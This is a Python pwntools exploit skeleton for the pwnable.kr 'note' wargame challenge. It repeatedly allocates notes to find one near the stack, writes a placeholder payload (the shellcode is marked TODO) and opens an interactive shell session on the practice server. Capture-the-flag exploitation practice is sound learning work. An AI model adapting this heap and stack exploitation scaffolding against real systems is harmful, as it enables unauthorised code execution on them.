import os
from pwn import *
import argparse


context.log_level = 'info'


ADDR = 'pwnable.kr'
PORT = 9019

BIN_PATH = './note'
E = ELF(BIN_PATH)


def create_note_near_stack(p):
    while True:
        p.recvuntil('5. exit')
        p.sendline('1')
        p.recvuntil(' [')
        note_addr = int(p.recvuntil(']', drop=True), base=16)
        if note_addr > 0xff500000:
            log.info('found address close to stack:  0x{:08x}'.format(note_addr))
            return note_addr
        else:
            p.recvuntil('5. exit')
            p.sendline('4')
            p.recvuntil('note no?\n')
            p.sendline('1')


def write_shellcode(p):
    p.recvuntil('5. exit')
    p.sendline('1')
    p.recvuntil(' [')
    shellcode_address = int(p.recvuntil(']', drop=True), base=16)
    p.recvuntil('5. exit')
    p.sendline('2')
    p.recvuntil('note no?\n')
    p.sendline('0')
    p.sendline(p32(0x41414141) * 100)  # TODO: fix the shellcode
    return shellcode_address


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('mode', choices=['local', 'debug', 'remote'])

    return parser.parse_args()


def start_process():
    args = parse_args()
    p = None

    if args.mode == 'local':
        log.info('running locally...')
        p = process(BIN_PATH)
    elif args.mode == 'debug':
        log.info('debugging...')
        p = gdb.debug([BIN_PATH], gdbscript='''
layout regs
continue
'''
        )
    elif args.mode == 'remote':
        log.info('pwning...')
        p = remote(ADDR, PORT)
    else:
        log.critical('invalid option')
        os.exit(1)
    return p


def main():
    p = start_process()

    shellcode_address = write_shellcode(p)
    log.info('shellcode address is 0x{:08x}'.format(shellcode_address))
    create_note_near_stack(p)
    p.interactive()


if __name__ == '__main__':
    main()

